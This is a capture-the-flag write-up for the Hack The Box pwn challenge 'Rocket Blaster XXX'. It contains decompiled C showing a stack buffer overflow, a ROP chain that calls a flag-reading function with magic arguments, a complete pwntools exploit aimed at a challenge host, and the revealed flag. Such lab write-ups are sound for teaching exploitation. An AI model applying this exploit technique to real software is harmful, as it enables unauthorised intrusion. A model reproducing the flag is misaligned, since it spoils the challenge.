# Rocket Blaster XXX

Prepare for the ultimate showdown! Load your weapons, gear up for battle, and dive into the epic fray—let the fight commence!

# Writeup

This is the main function:

```c
undefined8 main(void)

{
  undefined8 buffer;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  banner();
  buffer = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  fflush(stdout);
  printf(
        "\nPrepare for trouble and make it double, or triple..\n\nYou need to place the ammo in the right place to load the Rocket Blaster XXX!\n\n>> "
        );
  fflush(stdout);
  read(0,&buffer,102);
  puts("\nPreparing beta testing..");
  return 0;
}
```

We can do buffer overflow of 8*4 **buffer** dimension plus the **ebp** dimension (8 byte).

We want to execute the **fill_ammo** function with **param_1** equal to **0xdeadbeef**, **param_2** equal to **0xdeadbabe** and **param_3** equal to **0xdead1337**:

```c
void fill_ammo(long param_1,long param_2,long param_3)

{
  ssize_t sVar1;
  char local_d;
  int local_c;
  
  local_c = open("./flag.txt",0);
  if (local_c < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_1 != 0xdeadbeef) {
    printf("%s[x] [-] [-]\n\n%sPlacement 1: %sInvalid!\n\nAborting..\n",&DAT_00402010,&DAT_00402008,
           &DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_2 != 0xdeadbabe) {
    printf(&DAT_004020c0,&DAT_004020b6,&DAT_00402010,&DAT_00402008,&DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(2);
  }
  if (param_3 != 0xdead1337) {
    printf(&DAT_00402100,&DAT_004020b6,&DAT_00402010,&DAT_00402008,&DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(3);
  }
  printf(&DAT_00402140,&DAT_004020b6);
  fflush(stdin);
  fflush(stdout);
  while( true ) {
    sVar1 = read(local_c,&local_d,1);
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout);
  }
  close(local_c);
  fflush(stdin);
  fflush(stdout);
  return;
}
```

We can use some **ROP gadget** to call the function using the **x64 calling function convention** for linux.

The payload will be:

```
b'A' * offset
ret
pop_rdi
param_1
pop_rsi
param_2
pop_rdx
param_3
fill_ammo
```

So the final exploit will be:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 94.237.53.26 --port 42376 rocket_blaster_xxx
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'rocket_blaster_xxx')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
if args['LOCAL']:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False) # Can be found via $ ldd exe
else:
    libc = ELF('glibc/libc.so.6', checksec=False)
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '94.237.53.26'
port = int(args.PORT or 42376)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./glibc/'

io = start()

buffer_dim = 4 * 8
saved_rbp_dim = 8

offset = buffer_dim + saved_rbp_dim

fill_ammo = exe.symbols['fill_ammo']

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]

param_1 = 0xdeadbeef
param_2 = 0xdeadbabe
param_3 = 0xdead1337

payload = [
    b'A' * offset,
    p64(ret),
    p64(pop_rdi),
    p64(param_1),
    p64(pop_rsi),
    p64(param_2),
    p64(pop_rdx),
    p64(param_3),
    p64(fill_ammo)
]

payload = b''.join(payload)

io.sendlineafter(b'>>', payload)

io.interactive()
```

The flag is:

```
Ready to launch at: HTB{b00m_b00m_r0ck3t_2_th3_m00n}
```